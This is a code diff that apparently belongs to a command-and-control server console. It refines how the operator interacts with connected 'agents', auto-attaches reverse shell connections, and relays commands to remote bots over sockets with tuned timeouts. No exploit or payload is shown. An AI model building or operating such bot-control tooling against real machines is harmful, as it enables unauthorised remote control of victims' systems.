@@ -51,6 +51,7 @@ class Terminal(Cmd):
         print("To view available agents, use: list agents")
 
     def do_interact(self,args):
+
         # if only one agent connected - interact with it
         if len(self.ClientDict) == 1:
             self.agent = list(self.ClientDict.keys())[0]
@@ -79,31 +80,30 @@ class Terminal(Cmd):
             # For now shell is implemented in separate connection
             # Sleep while shell connection is created
             time.sleep(1)
-            self.shell = True
 
             # Parsing last agent ID from ClientDict
             self.parentagent = self.agent
             self.agent = list(self.ClientDict.keys())[-1]
-            
+            self.parentip = self.ClientDict[self.parentagent][0][0]
+            self.shellip = self.ClientDict[self.agent][0][0] 
 
-            self.do_interact(self.agent)
-            self.shellip = self.ClientDict[self.agent][0][0]
-
-            # TODO - IMPLEMENT VERIFICATION IF SAME IP? ONLY THEN ASSIGN QUEUE?
-            print("[DBG]")
-            print(self.ClientDict)
-            print("ParentIP: {}".format( self.ClientDict[self.parentagent][0][0]))
-            print("ShellIP: {}".format(self.ClientDict[self.agent][0][0]))
-            if self.ClientDict[self.agent][0][0] ==  self.ClientDict[self.parentagent][0][0]:
-                print("IP match")
+            # Really rude check if that's shell agent... =_=
+            if self.parentip == self.shellip \
+                and len(self.ClientDict.keys()) > 1:
+                
+                self.shell = True
+                self.do_interact(self.agent)
+                self.shellip = self.ClientDict[self.agent][0][0]
+                self.prompt = '{} shell $ '.format(self.shellip)
+                # After Queue is assigned and IP parsed, can
+                # remove from ClientDict as not agent, but redundant connection
+                del self.ClientDict[self.agent]
             else:
-                print("Do Not match")
-            print("[END DBG]")
-            self.prompt = '{} shell $ '.format(self.shellip)
-            
-            # After Queue is assigned and IP parsed, can
-            # remove from ClientDict as not agent, but redundant connection
-            del self.ClientDict[self.agent]
+                print("[-] Error in auto-assignment: shell agent IP does not match parent one.")
+                print("\tPossibly no Shell connection recevied or different agent came in.")
+                print("\tPlease interact with shell agent ID manually!")
+                self.help_interact()
+                self.do_back(self)
 
     def do_back(self,args):
         if self.shell == True:
@@ -232,23 +232,18 @@ class Terminal(Cmd):
             pass
         else:
             self.q.put("\n")
-            # To not input prompt before response
-            while len(list(self.rq.queue)) > 1:
-                time.sleep(0.5)
-                print("[DBG]")
-                print(list(self.rq.queue))
-    
+            time.sleep(0.2)
+
     def default(self, args):
         if self.q == None:
             print("[-] You need to choose agent.")
             self.help_interact()
         else:
             self.q.put(args+"\n")
+            time.sleep(0.5)
             # To not input prompt before response
-            while len(list(self.rq.queue)) > 1:
-                time.sleep(0.5)
-                print("[DBG]")
-                print(list(self.rq.queue))
+            while len(list(self.rq.queue)) >= 1:
+                time.sleep(0.1)
 
 
 
@@ -321,25 +316,34 @@ class BotHandler(threading.Thread):
         # Command loop
         while True:
             RecvBotCmd = self.q.get()
+            #print("len(RecvBotCmd): {}".format(len(RecvBotCmd)))
             try:
                 self.client.send(RecvBotCmd.encode('utf-8'))
                 cmd_response = ""
                 while True:
                     try:
+                        if "\n" == RecvBotCmd:
+                            self.client.settimeout(0.1)
+                        
                         # long taking commands
-                        if "upload" in RecvBotCmd:
-                            self.client.settimeout(5)
+                        # add if some output notfully 
+                        # reveived in this while loop
                         elif "ping" in RecvBotCmd:
                             self.client.settimeout(5)
+                        
                         # cmd.exe shell returns input
-                        # wait if response not longer than command
+                        # if response not longer than command
+                        # then command is still executing
                         elif (len(cmd_response) <= len(RecvBotCmd)):
                             self.client.settimeout(5)
+                        
                         else:
                             self.client.settimeout(1)
+                        
                         recv = self.client.recv(4096).decode('utf-8')
                         # Queue needed to tell terminal to wait before showing prompt
                         self.rq.put(recv)
+
                     except socket.timeout:
                         # if timeout exception is triggered - assume no data anymore
                         recv = ""
@@ -366,8 +370,10 @@ class BotHandler(threading.Thread):
 
 
 if __name__ == '__main__':
+    
     ClientDict = {}
     Listeners = []
+
     # Search for Classes with '*listener*' pattern in name
     members = inspect.getmembers(sys.modules[__name__])
     for i in range(len(members)):
